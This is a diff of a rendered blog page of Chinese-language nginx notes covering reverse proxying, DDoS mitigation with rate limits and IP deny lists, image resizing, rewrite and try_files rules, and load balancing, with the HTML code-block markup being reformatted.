-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">limit_conn_zone $binary_remote_addr zone=addr:10m;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">    # ...</span><br><span class="line">    location /store/ &#123;</span><br><span class="line">        limit_conn addr 10;</span><br><span class="line">        # ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Closing Slow Connections<br>eg: 限定nginx一条connection写client header和写client body的时间间隔为5s，默认为60s</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    client_body_timeout 5s;</span><br><span class="line">    client_header_timeout 5s;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>黑名单</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// 123.123.123.1 through 123.123.123.16 拉黑</span><br><span class="line">location / &#123;</span><br><span class="line">    deny 123.123.123.0/28;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    deny 123.123.123.3;</span><br><span class="line">    deny 123.123.123.5;</span><br><span class="line">    deny 123.123.123.7;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//只允许特定白名单</span><br><span class="line">location / &#123;</span><br><span class="line">    allow 192.168.1.0/24;</span><br><span class="line">    deny all;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ngx_http_proxy_module的configuration<br>proxy_cache_use_stale<br>当客户端请求一项过期的资源时，只发送一次请求，在backend server返回新的资源之前，不再发送新的请求，并只向客户端返回已有的过期资源。这有助于缓解backend server的压力。<br>proxy_cache_key:包含内置三个key$scheme$proxy_host$request_uri。但不要添加$query_string，这会造成过多的caching.</p>
-</li>
-<li><p>几种情况是应该直接拉黑的</p>
-<blockquote>
-<p>Requests to a specific URL that seems to be targeted<br>Requests in which the User-Agent header is set to a value that does not correspond to normal client traffic<br>Requests in which the Referer header is set to a value that can be associated with an attack<br>Requests in which other headers have values that can be associated with an attack</p>
-</blockquote>
-</li>
+<pre><code>server_name example.com;
+
+location / {
+    proxy_pass http://APP_PRIVATE_IP_ADDRESS:8080; // A应用跑在8080端口，外部访问http://example.com/即可访问应用服务
+    proxy_http_version 1.1;
+    proxy_set_header Upgrade $http_upgrade;
+    proxy_set_header Connection &#39;upgrade&#39;;
+    proxy_set_header Host $host;
+    proxy_cache_bypass $http_upgrade;
+}
+
+location /app2 {
+   proxy_pass http://APP_PRIVATE_IP_ADDRESS:8081; // B应用跑在8081端口，外部访问http://example.com/app2即可访问应用服务
+   proxy_http_version 1.1;
+   proxy_set_header Upgrade $http_upgrade;
+   proxy_set_header Connection &#39;upgrade&#39;;
+   proxy_set_header Host $host;
+   proxy_cache_bypass $http_upgrade;
+</code></pre><p>   }<br>}</p>
+<pre><code>
+### 5.1 pratical take aways
+[nginx配置location总结及rewrite规则写法](http://seanlook.com/2015/05/17/nginx-location-rewrite/)
+
+
+### ddos防御
+from [mitigating-ddos-attacks-with-nginx-and-nginx-plus/](https://www.nginx.com/blog/mitigating-ddos-attacks-with-nginx-and-nginx-plus/)
+
+**allow a single client IP address to attempt to login only every 2 seconds (equivalent to 30 requests per minute):**
+
+
+1. Limiting the Rate of Requests
+eg: 单ip访问login接口频率不能超过2秒每次。
+```config
+limit_req_zone $binary_remote_addr zone=one:10m rate=30r/m;
+
+server {
+    # ...
+    location /login.html {
+        limit_req zone=one;
+    # ...
+    }
+}
+</code></pre><ol>
+<li>Limiting the Number of Connections<br>eg: 单ip访问/store/不能创建超过10条connections<br>```config<br>limit_conn_zone $binary_remote_addr zone=addr:10m;</li>
 </ol>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">location /foo.php &#123;</span><br><span class="line">    deny all; //直接让这个接口不响应</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line">    if ($http_user_agent ~* foo|bar) &#123;</span><br><span class="line">        return 403;  //User-Agent中有foo或者bar的时候直接forbidden</span><br><span class="line">    &#125;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// NGINX Plus提供的</span><br><span class="line">// An NGINX or NGINX Plus instance can usually handle many more simultaneous connections than the backend servers it is load balancing.</span><br><span class="line">//作为代理，nginx能够接受的连接数要远超其代理的后台服务</span><br><span class="line">upstream website &#123;</span><br><span class="line">    server 192.168.100.1:80 max_conns=200;</span><br><span class="line">    server 192.168.100.2:80 max_conns=200;</span><br><span class="line">    queue 10 timeout=30s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="5-2-Nginx模块"><a href="#5-2-Nginx模块" class="headerlink" title="5.2 Nginx模块"></a>5.2 Nginx模块</h3><p>http_image_filter_module（图片裁剪模块）<br>首先查看是否已安装http_image_filter_module模块</p>
+<p>server {</p>
+<pre><code># ...
+location /store/ {
+    limit_conn addr 10;
+    # ...
+}
+</code></pre><p>}</p>
+<pre><code>
+3. Closing Slow Connections
+eg: 限定nginx一条connection写client header和写client body的时间间隔为5s，默认为60s
+```config
+server {
+    client_body_timeout 5s;
+    client_header_timeout 5s;
+    # ...
+}
+</code></pre><ol>
+<li>黑名单<br>```config<br>// 123.123.123.1 through 123.123.123.16 拉黑<br>location / {<br> deny 123.123.123.0/28;<h1 id="…"><a href="#…" class="headerlink" title="…"></a>…</h1>}</li>
+</ol>
+<p>location / {<br>    deny 123.123.123.3;<br>    deny 123.123.123.5;<br>    deny 123.123.123.7;</p>
+<pre><code># ...
+</code></pre><p>}</p>
+<p>//只允许特定白名单<br>location / {<br>    allow 192.168.1.0/24;<br>    deny all;</p>
+<pre><code># ...
+</code></pre><p>}</p>
+<pre><code>
+5.  ngx_http_proxy_module的configuration
+proxy_cache_use_stale
+当客户端请求一项过期的资源时，只发送一次请求，在backend server返回新的资源之前，不再发送新的请求，并只向客户端返回已有的过期资源。这有助于缓解backend server的压力。
+proxy_cache_key:包含内置三个key$scheme$proxy_host$request_uri。但不要添加$query_string，这会造成过多的caching.
+
+6. 几种情况是应该直接拉黑的
+&gt;Requests to a specific URL that seems to be targeted  
+Requests in which the User-Agent header is set to a value that does not correspond to normal client traffic
+Requests in which the Referer header is set to a value that can be associated with an attack
+Requests in which other headers have values that can be associated with an attack
+
+```config
+location /foo.php {
+    deny all; //直接让这个接口不响应
+}
+
+location / {
+    if ($http_user_agent ~* foo|bar) {
+        return 403;  //User-Agent中有foo或者bar的时候直接forbidden
+    }
+    # ...
+}
+
+// NGINX Plus提供的
+// An NGINX or NGINX Plus instance can usually handle many more simultaneous connections than the backend servers it is load balancing.
+//作为代理，nginx能够接受的连接数要远超其代理的后台服务
+upstream website {
+    server 192.168.100.1:80 max_conns=200;
+    server 192.168.100.2:80 max_conns=200;
+    queue 10 timeout=30s;
+}
+</code></pre><h3 id="5-2-Nginx模块"><a href="#5-2-Nginx模块" class="headerlink" title="5.2 Nginx模块"></a>5.2 Nginx模块</h3><p>http_image_filter_module（图片裁剪模块）<br>首先查看是否已安装http_image_filter_module模块</p>
 <blockquote>
-<p>nginx -V<br>/etc/nginx/nginx.conf文件添加<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">location /image &#123;</span><br><span class="line">truetrue   alias &quot;/imgdirectory/&quot;; </span><br><span class="line">            ## 这样直接输入 yourip/image/imgname.jpg就能返回原始图片</span><br><span class="line">&#125;</span><br><span class="line">location ~* (.*\.(jpg|jpeg|gif|png))!(.*)!(.*)$ &#123;  ## 这个是匹配全站图片资源</span><br><span class="line">        		set $width      $3;  </span><br><span class="line">        		set $height     $4;  </span><br><span class="line">        		rewrite &quot;(.*\.(jpg|jpeg|gif|png))(.*)$&quot; $1;  ## 这样输入 yourip/image/imgname.jpg!200!200就能返回200*200的图片</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">location ~* /imgs/.*\.(jpg|jpeg|gif|png|jpeg)$ &#123;  </span><br><span class="line">truetruetrueroot &quot;/var/www/&quot;;</span><br><span class="line">  		image_filter resize $width $height;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>nginx -V<br>/etc/nginx/nginx.conf文件添加<br>```config<br>location /image {<br>           alias “/imgdirectory/“; </p>
+<pre><code>        ## 这样直接输入 yourip/image/imgname.jpg就能返回原始图片
+</code></pre><p>}<br>location ~<em> (.</em>.(jpg|jpeg|gif|png))!(.<em>)!(.</em>)$ {  ## 这个是匹配全站图片资源<br>                set $width      $3;<br>                set $height     $4;<br>                rewrite “(.<em>.(jpg|jpeg|gif|png))(.</em>)$” $1;  ## 这样输入 yourip/image/imgname.jpg!200!200就能返回200*200的图片<br>}  </p>
 </blockquote>
-<p>亲测上述可行，python也有类似库<a href="https://github.com/thumbor/thumbor">thumbor</a></p>
-<p>关于正则匹配：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">## 比如匹配全站所有的结尾图片</span><br><span class="line">location ~* \.(jpg|gif|png)$ &#123;</span><br><span class="line">               image_filter resize 500 500;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">### 匹配某个目录所有图片       </span><br><span class="line">location ~* /image/.*\.(jpg|gif|png)$ &#123;</span><br><span class="line">            image_filter resize 500 500;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
-<p>更多直接google吧。<br>关于这个var/www目录，按照惯例，这个目录里面就应该放example.com,anothersite.com,myblog.com,…这种根据一个个site名来放置资源和html文件。一个文件夹里放一个site相关的资源，当然这只是惯例。</p>
-<h3 id="添加黑名单"><a href="#添加黑名单" class="headerlink" title="添加黑名单"></a>添加黑名单</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##获取各个IP访问次数</span></span><br><span class="line"></span><br><span class="line">awk <span class="string">'&#123;print $1&#125;'</span> nginx.access.log |sort |uniq -c|sort -n</span><br><span class="line">sudo last | awk <span class="string">'&#123; print $(NF-7)&#125;'</span> | sort | uniq -c | sort -n //统计登录ip次数</span><br><span class="line"></span><br><span class="line">查看某个时间端中访问的日志，2018年7月28日上午10点到2018年7月30日下午1点的日志</span><br><span class="line">cat access.log | sed -n <span class="string">'/28\/Jul\/2018:10/,/30\/Jul\/2018:13/p'</span> | more</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## 新建一个黑名单文件 blacklist.conf ,放在 nginx/conf下面。</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">##添加一个IP ，deny 192.168.59.1;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 在http或者server模块引入</span></span><br><span class="line"></span><br><span class="line">  include blacklist.conf ;</span><br><span class="line"></span><br><span class="line"><span class="comment">##需要重启服务器, nginx -s reload; 即可生效</span></span><br></pre></td></tr></table></figure>
+<p>location ~<em> /imgs/.</em>.(jpg|jpeg|gif|png|jpeg)$ {<br>            root “/var/www/“;<br>          image_filter resize $width $height;<br>}</p>
+<pre><code>亲测上述可行，python也有类似库[thumbor](https://github.com/thumbor/thumbor)
+
+关于正则匹配：
+```config
+## 比如匹配全站所有的结尾图片
+location ~* \.(jpg|gif|png)$ {
+               image_filter resize 500 500;
+       }
+
+### 匹配某个目录所有图片       
+location ~* /image/.*\.(jpg|gif|png)$ {
+            image_filter resize 500 500;
+    }
+</code></pre><p>更多直接google吧。<br>关于这个var/www目录，按照惯例，这个目录里面就应该放example.com,anothersite.com,myblog.com,…这种根据一个个site名来放置资源和html文件。一个文件夹里放一个site相关的资源，当然这只是惯例。</p>
+<h3 id="添加黑名单"><a href="#添加黑名单" class="headerlink" title="添加黑名单"></a>添加黑名单</h3><pre><code class="bash">##获取各个IP访问次数
+
+awk &#39;{print $1}&#39; nginx.access.log |sort |uniq -c|sort -n
+sudo last | awk &#39;{ print $(NF-7)}&#39; | sort | uniq -c | sort -n //统计登录ip次数
+
+查看某个时间端中访问的日志，2018年7月28日上午10点到2018年7月30日下午1点的日志
+cat access.log | sed -n &#39;/28\/Jul\/2018:10/,/30\/Jul\/2018:13/p&#39; | more
+
+
+## 新建一个黑名单文件 blacklist.conf ,放在 nginx/conf下面。
+
+  ##添加一个IP ，deny 192.168.59.1;
+
+### 在http或者server模块引入
+
+  include blacklist.conf ;
+
+##需要重启服务器, nginx -s reload; 即可生效
+</code></pre>
 <p>防御DDOS是一个系统工程，这里只是一小点。</p>
-<h3 id="5-3-return-rewrite-and-try-files"><a href="#5-3-return-rewrite-and-try-files" class="headerlink" title="5.3 return rewrite and try_files"></a>5.3 return rewrite and try_files</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    server_name www.old-name.com;</span><br><span class="line">    return 301 $scheme://www.new-name.com$request_uri;</span><br><span class="line">&#125;</span><br><span class="line">301 (Moved Permanently)</span><br><span class="line">//上面的scheme是http或者https，request_url就是请求的url。</span><br></pre></td></tr></table></figure>
-<p>rewrite就更加复杂一点，比如可以manipulate url<br>Here’s a sample NGINX rewrite rule that uses the rewrite directive. It matches URLs that begin with the string /download and then include the /media/ or /audio/ directory somewhere later in the path. It replaces those elements with /mp3/ and adds the appropriate file extension, .mp3 or .ra. The $1 and $2 variables capture the path elements that aren’t changing. As an example, /download/cdn-west/media/file1 becomes /download/cdn-west/mp3/file1.mp3. If there is an extension on the filename (such as .flv), the expression strips it off and replaces it with .mp3.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    # ...</span><br><span class="line">    rewrite ^(/download/.*)/media/(\w+)\.?.*$ $1/mp3/$2.mp3 last;</span><br><span class="line">    rewrite ^(/download/.*)/audio/(\w+)\.?.*$ $1/mp3/$2.ra  last;</span><br><span class="line">    return  403;</span><br><span class="line">    # ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>In the following example, NGINX serves a default GIF file if the file requested by the client doesn’t exist. When the client requests (for example) <a href="http://www.domain.com/images/image1.gif">http://www.domain.com/images/image1.gif</a>, NGINX first looks for image1.gif in the local directory specified by the root or alias directive that applies to the location (not shown in the snippet). If image1.gif doesn’t exist, NGINX looks for image1.gif/, and if that doesn’t exist, it redirects to /images/default.gif. That value exactly matches the second location directive, so processing stops and NGINX serves that file and marks it to be cached for 30 seconds.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">try_files $uri $uri/ =404; ## 这么写的话，碰到找不到的，浏览器直接返回一个丑到爆的ngix默认404页面。</span><br><span class="line"></span><br><span class="line">location /images/ &#123;</span><br><span class="line">    try_files $uri $uri/ /images/default.gif;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location = /images/default.gif &#123;</span><br><span class="line">    expires 30s; ## expire这个就是跟缓存相关的</span><br><span class="line">    expires 1d;</span><br><span class="line">    expires 24h;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ \.(htm|html|gif|jpg|jpeg|png|bmp|ico|css|js|txt)$ &#123;</span><br><span class="line">    root /opt/webapp;</span><br><span class="line">    expires 24h; ## 这样直接根据后缀设定缓存也行啊，</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<h3 id="5-4-NGINX-LOAD-BALANCING-负载均衡"><a href="#5-4-NGINX-LOAD-BALANCING-负载均衡" class="headerlink" title="5.4 NGINX LOAD BALANCING 负载均衡"></a>5.4 NGINX LOAD BALANCING 负载均衡</h3><p>Load balancing across multiple application instances is a commonly used technique for optimizing resource utilization, maximizing throughput, reducing latency, and ensuring fault-tolerant configurations.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line">    upstream backend &#123;</span><br><span class="line">        server backend1.example.com weight=5;</span><br><span class="line">        server backend2.example.com down; #服务标记为离线，不再使用</span><br><span class="line">        server 192.0.0.1 backup; ## 备份服务器，其他全部宕机了才启用</span><br><span class="line">    &#125;</span><br><span class="line">    server &#123;</span><br><span class="line">        location / &#123;</span><br><span class="line">            proxy_pass http://backend; ## 所有的访问http://backend的流量都被导向上面的三个服务器</span><br><span class="line">            ## proxy_pass只是其中一种，还有fastcgi_pass, memcached_pass, uwsgi_pass, scgi_pass</span><br><span class="line">            proxy_set_header X-Real-IP $remote_addr; #把client的真实ip而不是nginx机器的ip传给后端服务</span><br><span class="line">            proxy_set_header Host $http_host; #把client请求中header里面的HOST传给后端服务</span><br><span class="line">            ## $host不带端口 $http_host带端口</span><br><span class="line">            proxy_pass_header    Server; ## 这个其实可以更改Response中返回的Server的值，意思就是让Nginx不要插手Server这个KEY，当然还得上游server设置好header</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>导向策略有多种：<br>1.Round-robin (默认) 1, 2 , 1, 2 ,1 ….如此反复<br>2.least_conn 连接数最少的优先（如果有weight，加权选择）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">upstream backend &#123;</span><br><span class="line">    least_conn;</span><br><span class="line">    server backend1.example.com;</span><br><span class="line">    server backend2.example.com;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h3 id="5-3-return-rewrite-and-try-files"><a href="#5-3-return-rewrite-and-try-files" class="headerlink" title="5.3 return rewrite and try_files"></a>5.3 return rewrite and try_files</h3><pre><code class="config">server {
+    listen 80;
+    listen 443 ssl;
+    server_name www.old-name.com;
+    return 301 $scheme://www.new-name.com$request_uri;
+}
+301 (Moved Permanently)
+//上面的scheme是http或者https，request_url就是请求的url。
+</code></pre>
+<p>rewrite就更加复杂一点，比如可以manipulate url<br>Here’s a sample NGINX rewrite rule that uses the rewrite directive. It matches URLs that begin with the string /download and then include the /media/ or /audio/ directory somewhere later in the path. It replaces those elements with /mp3/ and adds the appropriate file extension, .mp3 or .ra. The $1 and $2 variables capture the path elements that aren’t changing. As an example, /download/cdn-west/media/file1 becomes /download/cdn-west/mp3/file1.mp3. If there is an extension on the filename (such as .flv), the expression strips it off and replaces it with .mp3.</p>
+<pre><code class="config">server {
+    # ...
+    rewrite ^(/download/.*)/media/(\w+)\.?.*$ $1/mp3/$2.mp3 last;
+    rewrite ^(/download/.*)/audio/(\w+)\.?.*$ $1/mp3/$2.ra  last;
+    return  403;
+    # ...
+}
+</code></pre>
+<p>In the following example, NGINX serves a default GIF file if the file requested by the client doesn’t exist. When the client requests (for example) <a href="http://www.domain.com/images/image1.gif">http://www.domain.com/images/image1.gif</a>, NGINX first looks for image1.gif in the local directory specified by the root or alias directive that applies to the location (not shown in the snippet). If image1.gif doesn’t exist, NGINX looks for image1.gif/, and if that doesn’t exist, it redirects to /images/default.gif. That value exactly matches the second location directive, so processing stops and NGINX serves that file and marks it to be cached for 30 seconds.</p>
+<pre><code class="config">try_files $uri $uri/ =404; ## 这么写的话，碰到找不到的，浏览器直接返回一个丑到爆的ngix默认404页面。
+
+location /images/ {
+    try_files $uri $uri/ /images/default.gif;
+}
+
+location = /images/default.gif {
+    expires 30s; ## expire这个就是跟缓存相关的
+    expires 1d;
+    expires 24h;
+}
+
+location ~ \.(htm|html|gif|jpg|jpeg|png|bmp|ico|css|js|txt)$ {
+    root /opt/webapp;
+    expires 24h; ## 这样直接根据后缀设定缓存也行啊，
+}
+</code></pre>
+<h3 id="5-4-NGINX-LOAD-BALANCING-负载均衡"><a href="#5-4-NGINX-LOAD-BALANCING-负载均衡" class="headerlink" title="5.4 NGINX LOAD BALANCING 负载均衡"></a>5.4 NGINX LOAD BALANCING 负载均衡</h3><p>Load balancing across multiple application instances is a commonly used technique for optimizing resource utilization, maximizing throughput, reducing latency, and ensuring fault-tolerant configurations.</p>
+<pre><code class="config">http {
+    upstream backend {
+        server backend1.example.com weight=5;
+        server backend2.example.com down; #服务标记为离线，不再使用
+        server 192.0.0.1 backup; ## 备份服务器，其他全部宕机了才启用
+    }
+    server {
+        location / {
+            proxy_pass http://backend; ## 所有的访问http://backend的流量都被导向上面的三个服务器
+            ## proxy_pass只是其中一种，还有fastcgi_pass, memcached_pass, uwsgi_pass, scgi_pass
+            proxy_set_header X-Real-IP $remote_addr; #把client的真实ip而不是nginx机器的ip传给后端服务
+            proxy_set_header Host $http_host; #把client请求中header里面的HOST传给后端服务
+            ## $host不带端口 $http_host带端口
+            proxy_pass_header    Server; ## 这个其实可以更改Response中返回的Server的值，意思就是让Nginx不要插手Server这个KEY，当然还得上游server设置好header
+        }
+    }
+}
+</code></pre>
+<p>导向策略有多种：<br>1.Round-robin (默认) 1, 2 , 1, 2 ,1 ….如此反复<br>2.least_conn 连接数最少的优先（如果有weight，加权选择）</p>
+<pre><code class="config">upstream backend {
+    least_conn;
+    server backend1.example.com;
+    server backend2.example.com;
+}
+</code></pre>
 <ol>
 <li>ip_hash (一个ip只会导向固定的一个server，这个适合做ab test)<br>这些是主要的策略</li>
 </ol>
@@ -321,16 +649,141 @@ ga('send', 'pageview');
 <blockquote>
 <p>server_tokens off;   </p>
 </blockquote>
-<h3 id="7-整理一下linode的文章"><a href="#7-整理一下linode的文章" class="headerlink" title="7. 整理一下linode的文章"></a>7. 整理一下linode的文章</h3><p><a href="https://linode.com/docs/web-servers/nginx/how-to-configure-nginx/">linoe关于nginx配置的文章写得特别好</a><br>/etc/nginx/nginx.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">    ##</span><br><span class="line">    # Basic Settings</span><br><span class="line">    ##</span><br><span class="line"></span><br><span class="line">    sendfile on;</span><br><span class="line">    tcp_nopush on;</span><br><span class="line">    tcp_nodelay on;</span><br><span class="line">    keepalive_timeout 65;</span><br><span class="line">    types_hash_max_size 2048;</span><br><span class="line">    # server_tokens off;</span><br><span class="line"></span><br><span class="line">    # server_names_hash_bucket_size 64;</span><br><span class="line">    # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">    include /etc/nginx/mime.types;</span><br><span class="line">    default_type application/octet-stream;</span><br><span class="line"></span><br><span class="line">    ##</span><br><span class="line">    # Logging Settings</span><br><span class="line">    ##</span><br><span class="line"></span><br><span class="line">    access_log /var/log/nginx/access.log;</span><br><span class="line">    error_log /var/log/nginx/error.log;</span><br><span class="line"></span><br><span class="line">    ##</span><br><span class="line">    # Gzip Settings</span><br><span class="line">    ##</span><br><span class="line"></span><br><span class="line">    gzip on;</span><br><span class="line">    gzip_disable &quot;msie6&quot;;</span><br><span class="line">    # gzip_vary on;</span><br><span class="line">    # gzip_proxied any;</span><br><span class="line">    # gzip_comp_level 6;  // gzip基本上就是用cpu资源节省带宽，默认是1，最高是9，越大压缩效果越好，也越费cpu</span><br><span class="line">    # gzip_buffers 16 8k;</span><br><span class="line">    # gzip_http_version 1.1;</span><br><span class="line">    include /etc/nginx/sites-enabled/*; //引入site-enabled中所有文件</span><br><span class="line">    include /etc/nginx/conf.d/*.conf; //或者引入config.d文件夹中所有.config文件</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
-<p>关于sites-enabled和sites-available这两个文件夹。一般都是把真正的.conf文件写在sites-available里面，然后在sites-enable通过symbolic link去链接到sites-available中的文件。这样，万一哪天突然打算关掉某个website，直接删掉那个symbolic link就行了，但真正的配置文件不会被删掉<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/</span><br><span class="line">sudo ln -s /etc/nginx/sites-available/test.com /etc/nginx/sites-enabled/</span><br></pre></td></tr></table></figure></p>
+<h3 id="7-整理一下linode的文章"><a href="#7-整理一下linode的文章" class="headerlink" title="7. 整理一下linode的文章"></a>7. 整理一下linode的文章</h3><p><a href="https://linode.com/docs/web-servers/nginx/how-to-configure-nginx/">linoe关于nginx配置的文章写得特别好</a><br>/etc/nginx/nginx.conf</p>
+<pre><code class="config">http {
+
+    ##
+    # Basic Settings
+    ##
+
+    sendfile on;
+    tcp_nopush on;
+    tcp_nodelay on;
+    keepalive_timeout 65;
+    types_hash_max_size 2048;
+    # server_tokens off;
+
+    # server_names_hash_bucket_size 64;
+    # server_name_in_redirect off;
+
+    include /etc/nginx/mime.types;
+    default_type application/octet-stream;
+
+    ##
+    # Logging Settings
+    ##
+
+    access_log /var/log/nginx/access.log;
+    error_log /var/log/nginx/error.log;
+
+    ##
+    # Gzip Settings
+    ##
+
+    gzip on;
+    gzip_disable &quot;msie6&quot;;
+    # gzip_vary on;
+    # gzip_proxied any;
+    # gzip_comp_level 6;  // gzip基本上就是用cpu资源节省带宽，默认是1，最高是9，越大压缩效果越好，也越费cpu
+    # gzip_buffers 16 8k;
+    # gzip_http_version 1.1;
+    include /etc/nginx/sites-enabled/*; //引入site-enabled中所有文件
+    include /etc/nginx/conf.d/*.conf; //或者引入config.d文件夹中所有.config文件
+  }
+</code></pre>
+<p>关于sites-enabled和sites-available这两个文件夹。一般都是把真正的.conf文件写在sites-available里面，然后在sites-enable通过symbolic link去链接到sites-available中的文件。这样，万一哪天突然打算关掉某个website，直接删掉那个symbolic link就行了，但真正的配置文件不会被删掉</p>
